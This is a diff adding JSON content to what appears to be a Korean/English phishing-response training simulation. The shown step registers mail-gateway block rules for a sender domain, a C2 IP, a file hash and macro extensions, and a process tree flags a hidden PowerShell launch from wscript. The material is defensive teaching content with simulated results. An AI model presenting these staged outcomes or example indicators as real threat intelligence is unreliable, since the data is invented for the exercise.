+      "out": "[메일 게이트웨이 차단 룰 등록]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n📋 등록할 차단 룰 목록:\n\n  Rule #1 (발신자 차단):\n    Type:     SENDER_DOMAIN\n    Pattern:  *@cloudsec-conf.org\n    Action:   REJECT + 관리자 알림\n    Reason:   피싱 캠페인 발신 도메인\n\n  Rule #2 (IP 차단):\n    Type:     SOURCE_IP\n    Pattern:  185.220.101.34/32\n    Action:   DROP + 로그\n    Reason:   Tor Exit Node / C2 서버\n\n  Rule #3 (첨부파일 해시 차단):\n    Type:     ATTACHMENT_HASH\n    Pattern:  SHA256:a3f2c8...7b91e4\n    Action:   STRIP + 격리 + 알림\n    Reason:   악성 매크로 문서\n\n  Rule #4 (매크로 문서 경고):\n    Type:     ATTACHMENT_TYPE\n    Pattern:  *.docm, *.xlsm, *.pptm\n    Action:   WARNING_BANNER + 지연 배달(30분)\n    Reason:   매크로 포함 문서 추가 검사\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n[적용 결과]\n  ✅ Rule #1 적용 완료 — cloudsec-conf.org 발신 차단\n  ✅ Rule #2 적용 완료 — 185.220.101.34 IP 차단\n  ✅ Rule #3 적용 완료 — 악성 파일 해시 차단\n  ✅ Rule #4 적용 완료 — 매크로 문서 경고 배너\n  ✅ 전사 알림 발송 완료 — 피싱 주의보\n\n🛡️ 방어 조치 완료!\n   이 피싱 캠페인의 동일 공격은 이제 자동 차단됩니다.",
+      "def": "[메일 게이트웨이] 4개 차단 룰 등록 완료 — 발신자/IP/해시/확장자",
+      "defAction": "Source: Postfix 메일 게이트웨이\nTarget: 인바운드 이메일 전체\nAction: 4개 차단 룰 적용, 전사 피싱 주의보 발송, 동일 캠페인 자동 차단",
+      "desc": "분석에서 식별한 IOC(침해 지표)를 메일 게이트웨이에 차단 룰로 등록합니다. 발신 도메인, IP, 파일 해시, 매크로 확장자 등 다층 방어를 적용합니다.",
+      "descEn": "Register IOCs (Indicators of Compromise) identified from analysis as blocking rules in the mail gateway. Apply multi-layer defense including sender domain, IP, file hash, and macro extensions.",
+      "descVi": "",
+      "descAr": "",
+      "stepTitle": "메일 게이트웨이 차단 룰 등록",
+      "stepTitleEn": "Mail Gateway Block Rule Registration",
+      "stepTitleVi": "",
+      "stepTitleAr": "",
+      "feynman": "건물 경비실에 수배 전단을 붙이는 것과 같습니다. 범인의 얼굴(발신 도메인), 차량 번호(IP 주소), 지문(파일 해시)을 모두 등록합니다. 이제 같은 범인이 다시 오면 경비실(메일 게이트웨이)에서 자동으로 차단합니다. 추가로 '의심스러운 소포(매크로 문서)'는 일단 검사 후 배달하도록 경고 룰도 추가했습니다.",
+      "feynmanEn": "It's like posting wanted posters at the building security desk. The criminal's face (sender domain), license plate (IP address), and fingerprints (file hash) are all registered. Now the security desk (mail gateway) automatically blocks the same criminal. Additionally, 'suspicious packages (macro documents)' are now inspected before delivery.",
+      "feynmanVi": "",
+      "feynmanAr": "",
+      "expert": "다층 차단 전략: SENDER_DOMAIN(envelope/header 매칭), SOURCE_IP(CIDR 기반), ATTACHMENT_HASH(SHA256 바이너리 매칭), ATTACHMENT_TYPE(확장자 기반 정책). Rule #4의 지연 배달(30분)은 제로데이 매크로를 샌드박스에서 분석할 시간을 확보합니다. 전사 알림은 사용자 인식 제고를 위한 필수 조치입니다.",
+      "expertEn": "Multi-layer blocking strategy: SENDER_DOMAIN (envelope/header matching), SOURCE_IP (CIDR-based), ATTACHMENT_HASH (SHA256 binary matching), ATTACHMENT_TYPE (extension-based policy). Rule #4's delayed delivery (30min) secures time for sandbox analysis of zero-day macros. Company-wide alerts are essential for user awareness.",
+      "expertVi": "",
+      "expertAr": "",
+      "defTooltip": "🛡️ 메일 게이트웨이: 4개 IOC 기반 차단 룰 등록 — 동일 캠페인 자동 차단",
+      "defTooltipEn": "🛡️ Mail Gateway: 4 IOC-based blocking rules registered — same campaign auto-blocked",
+      "defTooltipVi": "",
+      "defTooltipAr": "",
+      "hackerLog": {
+        "title": "gateway_rules.log",
+        "lines": [
+          {
+            "log": "Rule #1: *@cloudsec-conf.org → REJECT",
+            "desc": "💡 피싱에 사용된 도메인의 모든 이메일을 차단합니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          },
+          {
+            "log": "Rule #2: 185.220.101.34 → DROP",
+            "desc": "💡 C2 서버/Tor 출구 노드 IP를 네트워크 레벨에서 차단합니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          },
+          {
+            "log": "Rule #4: *.docm → WARNING + 30분 지연",
+            "desc": "💡 매크로 문서는 즉시 배달하지 않고 30분간 샌드박스 분석 후 배달합니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          }
+        ]
+      },
+      "terms": [
+        {
+          "name": "메일 게이트웨이 (Mail Gateway)",
+          "desc": "회사로 들어오는 모든 이메일을 검사하고 필터링하는 보안 장비. 스팸, 피싱, 악성 첨부파일을 차단하는 '이메일 방화벽'입니다",
+          "descEn": "",
+          "descVi": "",
+          "descAr": ""
+        },
+        {
+          "name": "IOC (Indicator of Compromise)",
+          "desc": "침해 지표. 악성 IP, 도메인, 파일 해시 등 공격의 증거를 나타내는 기술적 데이터. 동일 공격을 자동 탐지/차단하는 데 사용합니다",
+          "descEn": "",
+          "descVi": "",
+          "descAr": ""
+        }
+      ]
+    }
+  ],
+  "processTree": [
+    {
+      "name": "OUTLOOK.EXE",
+      "depth": 0,
+      "alert": false,
+      "minStep": 0
+    },
+    {
+      "name": "WINWORD.EXE",
+      "depth": 0,
+      "alert": false,
+      "minStep": 3
+    },
+    {
+      "name": "wscript.exe (PID: 4521)",
+      "depth": 1,
+      "alert": true,
+      "minStep": 4
+    },
+    {
+      "name": "powershell.exe -hidden (PID: 4589)",
+      "depth": 2,
+      "alert": true,
+      "minStep": 4
+    }
+  ]
+}
